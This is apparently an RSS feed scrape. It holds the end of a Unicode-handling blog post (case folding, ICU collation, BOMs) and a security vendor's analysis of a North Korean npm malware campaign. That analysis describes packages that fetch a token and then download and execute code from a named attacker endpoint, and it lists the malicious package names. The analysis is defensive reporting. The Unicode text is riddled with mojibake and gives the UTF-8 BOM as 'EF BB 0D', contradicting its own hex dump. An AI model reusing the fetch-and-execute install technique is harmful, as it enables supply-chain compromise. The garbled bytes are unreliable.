    <p>First and foremost, there‚Äôs still a massive amount of software that doesn‚Äôt default to (or outright does not support) UTF-8, because it was either designed to work with legacy 8-bit encodings (like ISO-8859-1) or because it was designed in the ‚Äô90s to use UCS-2 and it‚Äôs permanently stuck with it or with faux <em>‚ÄúUTF-16‚Äù</em>.
Software libraries and frameworks like Qt, Java, Unreal Engine and the Win32 API are constantly converting text from UTF-8 (which is nowadays the sole Internet standard) to their internal UTF-16 representation. This is a massive waste of CPU cycles, which while more abundant than in the past, are still a finite resource.</p>

    <div><pre><code> <span>// Linux x86_64, Qt 6.5.1. Encoding is `en_US.UTF-8`.</span>
 <span>#include &lt;iostream&gt;
</span>
 <span>#include &lt;QCoreApplication&gt;
</span> <span>#include &lt;QDebug&gt;
</span>
 <span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>*</span><span>argv</span><span>[])</span> <span>{</span>
     <span>QCoreApplication</span> <span>app</span><span>{</span><span>argc</span><span>,</span> <span>argv</span><span>};</span>

     <span>// converts UTF-8 (the source file's encoding) to the internal QString representation</span>
     <span>const</span> <span>QString</span> <span>s</span><span>{</span><span>"ca√±a"</span><span>};</span> 

     <span>// prints `"ca√±a"``, using Qt's debugging facilities. This will convert back to UTF-8 in order</span>
     <span>// to print the string to the console</span>
     <span>qDebug</span><span>()</span> <span>&lt;&lt;</span> <span>s</span><span>;</span>

     <span>// prints `ca√±a`, using C++'s IOStreams. This will force Qt to convert the string to</span>
     <span>// a UTF-8 encoded std::string, which will then be printed to the console</span>
     <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>s</span><span>.</span><span>toStdString</span><span>()</span> <span>&lt;&lt;</span> <span>'\n'</span><span>;</span>

     <span>return</span> <span>0</span><span>;</span>
 <span>}</span>
</code></pre></div>
  </li>
  <li>
    <p>Case insensitivity in Unicode is a massive headache. First and foremost, the concept itself of ‚Äúignoring case‚Äù is deeply European-centric due to it being chiefly limited to <em>bicameral scripts</em> such as Latin, Cyrillic or Greek. What is considered the opposite case of a letter may vary as well, depending on the system‚Äôs locale:</p>

    <div><pre><code> <span>public</span> <span>class</span> <span>Up</span> <span>{</span>
     <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>final</span> <span>String</span><span>[]</span> <span>args</span><span>)</span> <span>{</span>
         <span>final</span> <span>var</span> <span>uc</span> <span>=</span> <span>"CIAO"</span><span>;</span>
         <span>final</span> <span>var</span> <span>lc</span> <span>=</span> <span>"ciao"</span><span>;</span>

         <span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>uc</span><span>.</span><span>toLowerCase</span><span>());</span>
         <span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>lc</span><span>.</span><span>toUpperCase</span><span>());</span>

         <span>System</span><span>.</span><span>out</span><span>.</span><span>printf</span><span>(</span><span>"uc(\"%s\") == \"%s\": %b\n"</span><span>,</span> <span>lc</span><span>,</span> <span>uc</span><span>,</span> <span>lc</span><span>.</span><span>toUpperCase</span><span>().</span><span>equals</span><span>(</span><span>uc</span><span>));</span>
     <span>}</span>
 <span>}</span>
</code></pre></div>

    <div><pre><code> <span>$ </span><span>echo</span> <span>$LANG</span>
 en_US.UTF-8
 <span>$ </span>java Up
 ciao
 CIAO
 uc<span>(</span><span>"ciao"</span><span>)</span> <span>==</span> <span>"CIAO"</span>: <span>true</span>
</code></pre></div>

    <p>This seems working fine until the runtime locale is switched to Turkish:</p>

    <div><pre><code> <span>$ </span><span>env </span><span>LANG</span><span>=</span><span>'tr_TR.UTF-8'</span> java Up
 cƒ±ao
 Cƒ∞AO
 uc<span>(</span><span>"ciao"</span><span>)</span> <span>==</span> <span>"CIAO"</span>: <span>false</span>
</code></pre></div>

    <p>In Turkish, the uppercase of <code>i</code> is <code>ƒ∞</code>, and the lowercase of <code>I</code> is <code>ƒ±</code>, which breaks the ASCII-centric assumption the Java<sup id="fnref:14" role="doc-noteref"><a href="#fn:14" rel="footnote">12</a></sup> snippet above is built on. There is a multitude of such examples of ‚Äúnaive‚Äù implementations of case insensitivity in Unicode that inevitably end up being incorrect under unforeseen circumstances.</p>

    <p>Taking all edge cases related to Unicode case folding into account is a lot of work, especially since it‚Äôs very hard to properly test all possible locales. This is the reason why <strong>Unicode handling is always best left to a library</strong>. For C/C++ and Java, the Unicode Consortium itself provides a reference implementation of the Unicode algorithms, called <a href="https://unicode-org.github.io/icu/">ICU</a>, which is used by a large number of frameworks and shipped by almost every major OS.</p>

    <p>While quite tricky to get right at times and at times more UTF-16 centric than I‚Äôd like, using ICU is still way saner than any self-written alternative:</p>

    <div><pre><code> <span>#include &lt;stdint.h&gt;
</span> <span>#include &lt;stdio.h&gt;
</span> <span>#include &lt;stdlib.h&gt;
</span> <span>#include &lt;string.h&gt;
</span>
 <span>#include &lt;unicode/ucasemap.h&gt;
</span> <span>#include &lt;unicode/utypes.h&gt;
</span>
 <span>int</span> <span>main</span><span>(</span><span>const</span> <span>int</span> <span>argc</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>const</span> <span>argv</span><span>[])</span> <span>{</span>
     <span>// Support custom locales</span>
     <span>const</span> <span>char</span><span>*</span> <span>const</span> <span>locale</span> <span>=</span> <span>argc</span> <span>&gt;</span> <span>1</span> <span>?</span> <span>argv</span><span>[</span><span>1</span><span>]</span> <span>:</span> <span>"en_US"</span><span>;</span>

     <span>UErrorCode</span> <span>status</span> <span>=</span> <span>U_ZERO_ERROR</span><span>;</span>

     <span>// Create a UCaseMap object for case folding</span>
     <span>UCaseMap</span><span>*</span> <span>const</span> <span>caseMap</span> <span>=</span> <span>ucasemap_open</span><span>(</span><span>locale</span><span>,</span> <span>0</span><span>,</span> <span>&amp;</span><span>status</span><span>);</span>
     <span>if</span> <span>(</span><span>U_FAILURE</span><span>(</span><span>status</span><span>))</span> <span>{</span>
         <span>printf</span><span>(</span><span>"Error creating UCaseMap: %s</span><span>\n</span><span>"</span><span>,</span> <span>u_errorName</span><span>(</span><span>status</span><span>));</span>
         <span>return</span> <span>EXIT_FAILURE</span><span>;</span>
     <span>}</span>

     <span>// Case fold the input string using the default settings</span>
     <span>const</span> <span>char</span> <span>input</span><span>[]</span> <span>=</span> <span>"CIAO"</span><span>;</span>
     <span>char</span> <span>lc</span><span>[</span><span>100</span><span>];</span>
     <span>const</span> <span>int32_t</span> <span>lcLength</span> <span>=</span> <span>ucasemap_utf8ToLower</span><span>(</span><span>caseMap</span><span>,</span> <span>lc</span><span>,</span> <span>sizeof</span> <span>lc</span><span>,</span> <span>input</span><span>,</span> <span>sizeof</span> <span>input</span><span>,</span> <span>&amp;</span><span>status</span><span>);</span>

     <span>if</span> <span>(</span><span>U_FAILURE</span><span>(</span><span>status</span><span>))</span> <span>{</span>
         <span>printf</span><span>(</span><span>"Error performing case folding: %s</span><span>\n</span><span>"</span><span>,</span> <span>u_errorName</span><span>(</span><span>status</span><span>));</span>
         <span>return</span> <span>1</span><span>;</span>
     <span>}</span>

     <span>// Print the lower case string</span>
     <span>printf</span><span>(</span><span>"lc(</span><span>\"</span><span>%s</span><span>\"</span><span>) == %.*s</span><span>\n</span><span>"</span><span>,</span> <span>input</span><span>,</span> <span>lcLength</span><span>,</span> <span>lc</span><span>);</span>

     <span>// Clean up resources</span>
     <span>ucasemap_close</span><span>(</span><span>caseMap</span><span>);</span>

     <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
 <span>}</span>
</code></pre></div>

    <div><pre><code> <span>$ </span>cc <span>-o</span> casefold casefold.c <span>-std</span><span>=</span>c11 <span>$(</span>icu-config <span>--ldflags</span><span>)</span>
 <span>$ </span>./casefold
 lc<span>(</span><span>"CIAO"</span><span>)</span> <span>==</span> ciao
 <span>$ </span>./casefold tr_TR
 lc<span>(</span><span>"CIAO"</span><span>)</span> <span>==</span> cƒ±ao
</code></pre></div>

    <p>Unicode generalises ‚Äúcase insensitivity‚Äù into the broader concept of <a href="https://unicode.org/L2/L2002/02186-foldings-0d6.html">character folding</a>, which boils down to a set of rules that define how characters can be transformed into other characters, in order to make them comparable.</p>
  </li>
  <li>
    <p>Similarly to folding, sorting text in a well-defined order (for instance alphabetical), an operation better known as <em><strong>collation</strong></em>, is also not trivial with Unicode.</p>

    <p>Different languages (and thus <em>locales</em>) may have different sorting rules, even with the Latin scripts.</p>

    <p>If, perchance, someone wanted to sort the list of words <code>[ "tuck", "l√∂we", "luck", "zebra"]</code>:</p>

    <ul>
      <li>In German, ‚Äò√ñ‚Äô is placed between ‚ÄòO‚Äô and ‚ÄòP‚Äô, and the rest of the alphabet follows the same order as in English. The correct sorting for that list is thus <code>[ "l√∂we", "luck", "tuck", "zebra"]</code>;</li>
      <li>In Estonian, ‚ÄòZ‚Äô is placed between ‚ÄòS‚Äô and ‚ÄòT‚Äô, and ‚Äò√ñ‚Äô is the penultimate letter of the alphabet. The list is then sorted as <code>[ "luck", "l√∂we", "zebra", "tuck"]</code>;</li>
      <li>In Swedish, ‚Äò√ñ‚Äô is the last letter of the alphabet, with the classical Latin letters in their usual order. The list is thus <code>[ "luck", "l√∂we", "tuck", "zebra"]</code>.</li>
    </ul>

    <p>Unicode defines <a href="https://unicode.org/reports/tr10/">a complex set of rules for collation</a> and provides a reference implementation in ICU through the <code>ucol</code> API (and its relative C++ and Java equivalents).</p>

    <div><pre><code> <span>#define _GNU_SOURCE // for qsort_r
</span>
 <span>#include &lt;stdint.h&gt;
</span> <span>#include &lt;stdio.h&gt;
</span> <span>#include &lt;stdlib.h&gt;
</span> <span>#include &lt;string.h&gt;
</span>
 <span>#include &lt;unicode/ustring.h&gt;
</span> <span>#include &lt;unicode/ucol.h&gt;
</span> <span>#include &lt;unicode/uloc.h&gt;
</span>
 <span>int</span> <span>strcmp_helper</span><span>(</span><span>const</span> <span>void</span> <span>*</span><span>const</span> <span>a</span><span>,</span> <span>const</span> <span>void</span> <span>*</span><span>const</span> <span>b</span><span>,</span> <span>void</span> <span>*</span><span>const</span> <span>ctx</span><span>)</span> <span>{</span>
     <span>const</span> <span>char</span> <span>*</span><span>const</span> <span>str1</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>char</span><span>**</span><span>)</span> <span>a</span><span>,</span> <span>*</span><span>const</span> <span>str2</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>char</span><span>**</span><span>)</span> <span>b</span><span>;</span>

     <span>UErrorCode</span> <span>status</span> <span>=</span> <span>U_ZERO_ERROR</span><span>;</span>
        
     <span>const</span> <span>UCollationResult</span> <span>cres</span> <span>=</span> <span>ucol_strcollUTF8</span><span>(</span><span>ctx</span><span>,</span> <span>str1</span><span>,</span> <span>strlen</span><span>(</span><span>str1</span><span>),</span> <span>str2</span><span>,</span> <span>strlen</span><span>(</span><span>str2</span><span>),</span> <span>&amp;</span><span>status</span><span>);</span>

     <span>return</span> <span>(</span><span>cres</span> <span>==</span> <span>UCOL_GREATER</span><span>)</span> <span>-</span> <span>(</span><span>cres</span> <span>==</span> <span>UCOL_LESS</span><span>);</span>
 <span>}</span>

 <span>void</span> <span>sort_strings</span><span>(</span><span>UCollator</span> <span>*</span><span>const</span> <span>collator</span><span>,</span> <span>const</span> <span>char</span> <span>**</span><span>const</span> <span>strings</span><span>,</span> <span>const</span> <span>ptrdiff_t</span> <span>n</span><span>)</span> <span>{</span>
     <span>qsort_r</span><span>(</span><span>strings</span><span>,</span> <span>n</span><span>,</span> <span>sizeof</span> <span>*</span><span>strings</span><span>,</span> <span>strcmp_helper</span><span>,</span> <span>collator</span><span>);</span>
 <span>}</span>

 <span>int</span> <span>main</span><span>(</span><span>const</span> <span>int</span> <span>argc</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>argv</span><span>[])</span> <span>{</span>
     <span>// Support custom locales</span>
     <span>const</span> <span>char</span><span>*</span> <span>locale</span> <span>=</span> <span>getenv</span><span>(</span><span>"ICU_LOCALE"</span><span>);</span>

     <span>if</span> <span>(</span><span>!</span><span>locale</span><span>)</span> <span>{</span>
         <span>locale</span> <span>=</span> <span>"en_US"</span><span>;</span>
     <span>}</span>

     <span>UErrorCode</span> <span>status</span> <span>=</span> <span>U_ZERO_ERROR</span><span>;</span>
        
     <span>// Create a UCaseMap object for case folding</span>
     <span>UCollator</span> <span>*</span><span>const</span> <span>coll</span> <span>=</span> <span>ucol_open</span><span>(</span><span>locale</span><span>,</span> <span>&amp;</span><span>status</span><span>);</span>
     <span>if</span> <span>(</span><span>U_FAILURE</span><span>(</span><span>status</span><span>))</span> <span>{</span>
         <span>printf</span><span>(</span><span>"Error creating UCollator: %s</span><span>\n</span><span>"</span><span>,</span> <span>u_errorName</span><span>(</span><span>status</span><span>));</span>
         <span>return</span> <span>EXIT_FAILURE</span><span>;</span>
     <span>}</span>
        
     <span>sort_strings</span><span>(</span><span>coll</span><span>,</span> <span>++</span><span>argv</span><span>,</span> <span>argc</span> <span>-</span> <span>1</span><span>);</span>

     <span>// Clean up resources</span>
     <span>ucol_close</span><span>(</span><span>coll</span><span>);</span>
        
     <span>while</span> <span>(</span><span>*</span><span>argv</span><span>)</span> <span>{</span>
         <span>puts</span><span>(</span><span>*</span><span>argv</span><span>++</span><span>);</span>
     <span>}</span>
    
     <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
 <span>}</span>
</code></pre></div>

    <div><pre><code> <span>$ </span><span>env </span><span>ICU_LOCALE</span><span>=</span>de_DE ./coll <span>"tuck"</span> <span>"l√∂we"</span> <span>"luck"</span> <span>"zebra"</span> <span># German</span>
 l√∂we
 luck
 tuck
 zebra
 <span>$ </span><span>env </span><span>ICU_LOCALE</span><span>=</span>et_EE ./coll <span>"tuck"</span> <span>"l√∂we"</span> <span>"luck"</span> <span>"zebra"</span> <span># Estonian</span>
 luck
 l√∂we
 zebra
 tuck
 <span>$ </span><span>env </span><span>ICU_LOCALE</span><span>=</span>sv_SE ./coll <span>"tuck"</span> <span>"l√∂we"</span> <span>"luck"</span> <span>"zebra"</span> <span># Swedish</span>
 luck
 l√∂we
 tuck
 zebra
 <span>$ </span><span># more complex case: sorting Japanese Kana using the Japanese locale's goj≈´on order</span>
 <span>$ </span><span>env </span><span>ICU_LOCALE</span><span>=</span>ja ./coll <span>"„Éë„É≥„ÉÄ"</span> <span>"„ÅÇ„Çä„Åå„Å®„ÅÜ"</span> <span>"„Éë„ÇΩ„Ç≥„É≥"</span> <span>"„Åï„Çà„Å™„Çâ"</span> <span>"„Ç´„Éº„Éâ"</span>
 „ÅÇ„Çä„Åå„Å®„ÅÜ
 „Ç´„Éº„Éâ
 „Åï„Çà„Å™„Çâ
 „Éë„ÇΩ„Ç≥„É≥
 „Éë„É≥„ÉÄ
</code></pre></div>
  </li>
  <li>
    <p>To facilitate UTF-8 detection when other encodings may be in use, some platforms annoyingly add a UTF-8 BOM (<code>EF BB 0D</code>) at the beginning of text files. Microsoft‚Äôs Visual Studio is historically a major offender in this regard:</p>

    <div><pre><code> <span>$ </span> file OldProject.sln
 OldProject.sln: Unicode text, UTF-8 <span>(</span>with BOM<span>)</span> text, with CRLF line terminators
 <span>$ </span>xxd OldProject.sln | <span>head</span> <span>-n</span> 1
 00000000: efbb bf0d 0a4d 6963 726f 736f 6674 2056  .....Microsoft V
</code></pre></div>

    <p>The sequence is simply <code>U+FEFF</code>, just like in UTF-16 and 32, but encoded in UTF-8. While it‚Äôs not forbidden by the standard per se, it has no real utility besides signaling that the file is in UTF-8 (it makes no sense talking about endianness with single bytes). Programs that need to parse or operate on UTF-8 encoded files should always be aware that a BOM may be present, and probe for it to avoid exposing users to unnecessary complexity they probably don‚Äôt care about.</p>
  </li>
  <li>
    <p>Because of all of the reasons listed above, random, array-like access to Unicode strings is almost always broken - this is true even with UTF-32, due to grapheme clusters. It also follows that operations such as string slicing are not trivial to implement correctly, and the way languages such as Python and JavaScript do it (codepoint by codepoint) is IMHO arguably problematic.</p>

    <p>A good example of a modern language that attempts to mitigate this issue is Rust, which has UTF-8 strings that disallow indexed access and only support slicing at byte indices, with UTF-8 validation at runtime:</p>

    <div><pre><code> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
     <span>let</span> <span>s</span> <span>=</span> <span>"ca√±a"</span><span>;</span>

     <span>// error[E0277]: the type `str` cannot be indexed by `{integer}`</span>
     <span>// let c = s[1];</span>

     <span>// char-by-char access requires iterators</span>
     <span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>s</span><span>.chars</span><span>()</span><span>.nth</span><span>(</span><span>2</span><span>)</span><span>.unwrap</span><span>());</span> <span>// OK: √±</span>

     <span>// this will crash the program at runtime:</span>
     <span>// "byte index 3 is not a char boundary; it is inside '√±' (bytes 2..4) of `ca√±a`"</span>
     <span>// let slice = &amp;s[1..3]);</span>

     <span>// the user needs to check UTF-8 character bounds beforehand</span>
     <span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>&amp;</span><span>s</span><span>[</span><span>1</span><span>..</span><span>4</span><span>]);</span> <span>// OK: "a√±"</span>
 <span>}</span>
</code></pre></div>

    <p>The stabilisation of the <code>.chars()</code> method took quite a long time, reflecting the fact that deducing what is or is not a character in Unicode is complex and quite controversial. The method itself ended up implementing iteration over Rust‚Äôs <code>char</code>s (aka, Unicode scalar codepoints) instead of grapheme clusters, which is rarely what the user wants. The fact it returns an iterator does at least effectively express that character-by-character access in Unicode is not, indeed, the ‚Äúsimple‚Äù operation developers have been so long accustomed to.</p>
  </li>
</ol>

<h2 id="wrapping-up">Wrapping up</h2>

<p>Unicode is a massive standard, and it‚Äôs constantly adding new characters<sup id="fnref:15" role="doc-noteref"><a href="#fn:15" rel="footnote">13</a></sup>, so for everybody‚Äôs safety it‚Äôs always best to rely on libraries to provide Unicode support, and if necessary ship fonts that support all the characters you may need (such as <em>Noto Fonts</em>). As previously introduced, C and C++ do not provide great support for Unicode, so it‚Äôs always best to just use ICU, which is widely supported and shipped by every major OS (<a href="https://learn.microsoft.com/en-us/windows/win32/intl/international-components-for-unicode--icu-">including Windows</a>).</p>

<p>When handling text that may contain non-English characters, it‚Äôs always best to stick to UTF-8 when possible and use Unicode-aware libraries for text processing. While writing custom text processing code may seem doable, it‚Äôs easy to miss a few corner cases and confuse end users in the process.</p>

<p>This is especially important because the main users of localized text and applications tend to often be the least technically savvy - those who may lack the ability to understand why the piece of software they are using is misbehaving, and can‚Äôt search for help in a language they don‚Äôt understand.</p>

<p>I hope this article may have been useful to shed some light on what is, in my opinion, an often overlooked topic in software development, especially among C++ users. If I had to be honest, I was striving for a shorter article, but I guess I had to make up for all those years I didn‚Äôt post a thing :)</p>

<p>As always, feel free to comment underneath or send me a message if anything does not look right, and hopefully, the next post will come before 2025‚Ä¶</p>



</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Social engineering campaign targeting tech employees spreads through NPM malware (106 pts)]]></title>
            <link>https://socket.dev/blog/social-engineering-campaign-npm-malware</link>
            <guid>36865060</guid>
            <pubDate>Tue, 25 Jul 2023 16:35:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://socket.dev/blog/social-engineering-campaign-npm-malware">https://socket.dev/blog/social-engineering-campaign-npm-malware</a>, See on <a href="https://news.ycombinator.com/item?id=36865060">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="ltr"><p>The digital world is becoming increasingly perilous as nefarious actors, especially state-sponsored groups, grow bolder in their cyber-espionage and cyber-theft operations. A <a href="https://github.blog/2023-07-18-security-alert-social-engineering-campaign-targets-technology-industry-employees/#indicators">recent alert from GitHub</a> has sounded the alarm bells about a sophisticated social engineering scheme, which has been tied to the Lazarus Group.</p><p>This North Korean state-backed hacking syndicate, with known aliases like Jade Sleet and TraderTraitor, has been on the radar of several intelligence agencies, notably after the <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a">US government's expos√©</a> on their tactics in 2022. Their modus operandi involves compromising or fabricating GitHub accounts, luring professionals from sectors such as cryptocurrency, online gambling, and cybersecurity into seemingly benign collaborations. The end goal is malevolent: using malware-infected NPM packages to infiltrate their targets' devices.</p><p>The group's tactics are quite intricate. For instance, initial contact often moves to other platforms like WhatsApp, where the rapport is built before the unsuspecting victims are led to clone malware-laden GitHub repositories. Our investigation reveals that these NPM packages connect to remote servers, fetching additional malware to unleash on the infected devices.</p><p>Take one of the malicious packages, <a href="https://socket.dev/npm/package/assets-table/files/1.0.0/assets-table.js#T13199-13206">assets-table</a>, for example. This snippet highlights a key part of the initial payload:</p><p><img alt=" " loading="lazy" src="https://cdn.sanity.io/images/cgdhsj6q/production/dc7b9ce6687268218b26e0fc3b566c18583cdf67-1874x376.png?w=1600&amp;fit=max&amp;auto=format"></p><p>This blog post delves deep into the technical workings of the attack, providing insights into the malicious code and offering measures developers can take to defend against such threats.</p><h2 id="Attribution-to-Lazarus">Attribution to Lazarus<a href="#Attribution-to-Lazarus">#</a></h2><p><a href="https://socket.dev/">Socket</a> detected and blocked the majority of these malicious packages within seconds of publish for the 3,000+ organizations who use Socket to protect their GitHub repos.</p><p>But it was GitHub themselves who was able to <a href="https://github.blog/2023-07-18-security-alert-social-engineering-campaign-targets-technology-industry-employees/#threat-actor-profile">attribute the attack</a> to North Korean threat actors:</p><blockquote>We assess with high confidence that this campaign is associated with a group operating in support of North Korean objectives, known as Jade Sleet by Microsoft Threat Intelligence and TraderTraitor by the U.S. Cybersecurity and Infrastructure Security Agency (CISA). Jade Sleet mostly targets users associated with cryptocurrency and other blockchain-related organizations, but also targets vendors used by those firms.</blockquote><p>GitHub's analysis reveals a sophisticated multi-step attack chain primarily targeting the npm ecosystem.</p><ol><li><strong>Initial Contact</strong>: Jade Sleet, the threat actor group believed to be operating from North Korea, creates fake developer or recruiter profiles on platforms like GitHub, LinkedIn, Slack, and Telegram. In some cases, they hijack legitimate accounts.</li><li><strong>Repository Collaboration</strong>: After making contact, the threat actor invites targets to collaborate on a GitHub repository, which contains software with malicious npm dependencies.</li><li><strong>Execution of Malicious Software</strong>: When the target clones and runs the repository content, the malicious npm packages within serve as first-stage malware that fetches and runs second-stage malware on the victim's machine.</li></ol><p>This isn't the Lazarus Group's first rodeo. They've <a href="https://www.bleepingcomputer.com/news/security/north-korean-hackers-are-targeting-security-researchers-with-malware-0-days/">previously engineered</a> malicious campaigns targeting security researchers, often leveraging counterfeit "security researcher" profiles on social media platforms. By luring these experts into collaborating on fake projects, the group successfully infected their devices. In <a href="https://www.bleepingcomputer.com/news/security/google-north-korean-hackers-target-security-researchers-again/">another instance</a>, they established a sham company, SecuriElite, as a front to distribute malware.</p><p>Peeling back the layers on Lazarus's past reveals a consistent theme: a relentless pursuit of cryptocurrency. Their attacks range from disseminating compromised cryptocurrency wallets to <a href="https://techcrunch.com/2022/04/15/us-officials-link-north-korean-lazarus-hackers-to-625m-axie-infinity-crypto-theft/">stealing a staggering $625 million from a blockchain game</a>. In the latter case, the group employed a deceitful job offer as their entry point. This is reminiscent of the "<a href="https://www.eset.com/int/about/newsroom/press-releases/research/eset-research-discovers-new-lazarus-dreamjob-campaign-and-links-it-to-phone-provider-3cx-supply-chai/">Operation Dream Job</a>" campaign from 2020, where the group targeted defense and aerospace professionals in the US using fabricated employment opportunities.</p><h2 id="The-Attack-Chain-Explained">The Attack Chain Explained<a href="#The-Attack-Chain-Explained">#</a></h2><h3><strong>1. Initiation Through Paired Packages</strong>:</h3><ul><li>The attack is spread across two distinct NPM packages that must be executed in sequence. An example of two such malicious packages are <a href="https://socket.dev/npm/package/assets-graph/overview/1.0.0">assets-graph</a> and <a href="https://socket.dev/npm/package/assets-table/overview/1.0.0">assets-table</a>, which operate in tandem.</li><li>The order of their execution is pivotal; the first package fetches a token, while the second utilizes this token.</li></ul><h3><strong>2. Token Retrieval</strong>:</h3><ul><li>Upon execution, the first package contacts one of several potential remote servers.</li><li>It retrieves a unique token, which is then stored locally within a subdirectory, typically found under a folder such as <code>$HOME_DIR/.vscode/npmcache</code>.</li></ul><p>Excerpt from <a href="https://socket.dev/npm/package/tslib-react/files/1.7.1/main.js">tslib-react</a>:</p><p><img alt=" " loading="lazy" src="https://cdn.sanity.io/images/cgdhsj6q/production/811040c68decd2167ace3c125fa6d7a85de62634-1874x1540.png?w=1600&amp;fit=max&amp;auto=format"></p><h3><strong>3. First File Execution</strong>:</h3><ul><li>Within some packages, the malicious code is the only source code present (example: <a href="https://socket.dev/npm/package/tslib-react/files/1.7.1/main.js">tslib-react</a>). In others, it is surreptitiously appended to an extensive file, hiding in plain sight (example: <a href="https://socket.dev/npm/package/assets-table/files/1.0.0/assets-table.js#L528,">assets-table</a>).</li></ul><h3><strong>4. Second File Execution</strong>:</h3><ul><li>After successful execution of the first file, the previously acquired token can now be found in a known directory on the user's system, marking the machine as ready for the second stage.</li><li>The second script is activated during the installation of the second package.</li><li>The code probes for the token file at <code>$HOME_DIR/.vscode/npmcache</code> created by the first package.</li></ul><p>Excerpt from <a href="https://socket.dev/npm/package/tslib-util/files/1.6.2/main.js">tslib-util</a>:</p><p><img alt=" " loading="lazy" src="https://cdn.sanity.io/images/cgdhsj6q/production/0f6e072c9c67e8e7e05c291d8204f165b4b12de6-1850x2730.png?w=1600&amp;fit=max&amp;auto=format"></p><h3><strong>5. Token Utilization and Payload Execution</strong>:</h3><ul><li>The script downloads the data at the <code>https://npmjsregister.com/getupdate.php</code> endpoint.</li><li>The data is saved to a file and then executed as a <code>node</code> script.</li></ul><p>While the full extent of this secondary payload remains shrouded in mystery, the level of sophistication and the concealment strategies used by this group is a testament to their capabilities.</p><h2 id="How-to-Protect-Yourself">How to Protect Yourself<a href="#How-to-Protect-Yourself">#</a></h2><ol><li><strong>Review repository invitations</strong>: If you received a collaboration request from any of the accounts mentioned in the <a href="https://github.blog/2023-07-18-security-alert-social-engineering-campaign-targets-technology-industry-employees/#indicators">GitHub blog post</a>, you've been targeted.</li><li><strong>Scrutinize new packages, installation scripts, and dependencies</strong>: Scrutinize recently published npm packages and their installation scripts. Extra caution is required if they establish network connections during installation. You can use <a href="https://socket.dev/github-app">Socket for GitHub</a> to automatically warn developers whenever a dependency update adds new capabilities such as network access or new install scripts during installation.</li><li><strong>Alert your security team</strong>: If you've executed content due to this campaign, notify your organization's cybersecurity department immediately.</li><li><strong>Stay vigilant:</strong> Be cautious when approached on social media to collaborate or install npm packages, especially if you belong to the industries highlighted.</li><li><strong>If impacted, take appropriate steps</strong>: Reset or wipe potentially affected devices, change account passwords, and rotate any sensitive credentials/tokens.</li></ol><h2 id="How-Socket-defends-you-from-this-attack-and-others-like-it">How Socket defends you from this attack and others like it<a href="#How-Socket-defends-you-from-this-attack-and-others-like-it">#</a></h2><p>Traditional <a href="https://socket.dev/blog/why-sca-software-composition-analysis-tools-suck">Software Composition Analysis (SCA) tools</a> are lacking because <em>they don't even attempt</em> to catch zero-day malware like this campaign. However, Socket provides a robust shield against such threats.</p><ul><li><strong>Deep Package Inspection</strong>: Instead of merely reacting to known vulnerabilities, Socket proactively inspects dependencies and their behavior. By understanding how packages are expected to act, Socket can quickly identify deviations, offering a first line of defense against threats before they become widespread.</li><li><strong>Actionable Feedback</strong>: Should a potential threat be detected, Socket provides clear feedback, allowing developers to take immediate action. We also a send proactive alert to the security team the moment that a developer opens a PR with a compromised dependency.</li><li><strong>Constant Monitoring</strong>: Socket constantly scans and monitors the open-source ecosystem, staying ahead of potential threats and ensuring users are protected in real-time.</li></ul><p><img alt=" " loading="lazy" src="https://cdn.sanity.io/images/cgdhsj6q/production/8514206ab0055f6cd5cc749ed557ac5db144d559-2532x1298.png?w=1600&amp;fit=max&amp;auto=format"></p><p>In the face of escalating supply chain attacks, Socket represents the next generation of security tools, ensuring developers can safely harness the power and innovation of the open-source community.</p><h2 id="Install-Socket-for-free-in-2-clicks">Install Socket for free in 2 clicks<a href="#Install-Socket-for-free-in-2-clicks">#</a></h2><p><strong>Protect your projects and secure your open-source dependencies</strong>. <a href="http://socket.dev/github-app">Install Socket for GitHub</a> today, or <a href="https://socket.dev/demo">book a demo</a> to learn more about how Socket can fortify your defenses against supply chain attacks and help to stop attacks just like this one.</p><p><img alt=" " loading="lazy" src="https://cdn.sanity.io/images/cgdhsj6q/production/88b61a2d9914069904bb40c4ff4a62acb11b891b-2544x1436.png?w=1600&amp;fit=max&amp;auto=format"></p><h2 id="Indicators">Indicators<a href="#Indicators">#</a></h2><h3>Malicious npm packages</h3><p>This is the list of affected packages, as far as we know to date. Each package is linked the corresponding Socket package health report, so you can get an idea of what Socket's "capability&nbsp;analysis" detects within each package:</p><ul><li><a href="https://socket.dev/npm/package/assets-graph/overview/1.0.0">assets-graph</a></li><li><a href="https://socket.dev/npm/package/assets-table/overview/1.0.0">assets-table</a></li><li><a href="https://socket.dev/npm/package/audit-ejs">audit-ejs</a></li><li><a href="https://socket.dev/npm/package/audit-vue">audit-vue</a></li><li><a href="https://socket.dev/npm/package/binance-prices/overview/1.2.12">binance-prices</a></li><li><a href="https://socket.dev/npm/package/coingecko-prices/overview/3.15.1">coingecko-prices</a></li><li><a href="https://socket.dev/npm/package/btc-web3/overview/1.0.1">btc-web3</a></li><li><a href="https://socket.dev/npm/package/cache-react/overview/1.0.2">cache-react</a></li><li><a href="https://socket.dev/npm/package/cache-vue/overview/1.0.2">cache-vue</a></li><li><a href="https://socket.dev/npm/package/chart-tablejs/overview/1.0.1">chart-tablejs</a></li><li><a href="https://socket.dev/npm/package/chart-vxe/overview/0.0.9">chart-vxe</a></li><li><a href="https://socket.dev/npm/package/couchcache-audit/overview/1.1.2">couchcache-audit</a></li><li><a href="https://socket.dev/npm/package/ejs-audit/overview/1.7.2">ejs-audit</a></li><li><a href="https://socket.dev/npm/package/elliptic-helper/overview/1.2.7">elliptic-helper</a></li><li><a 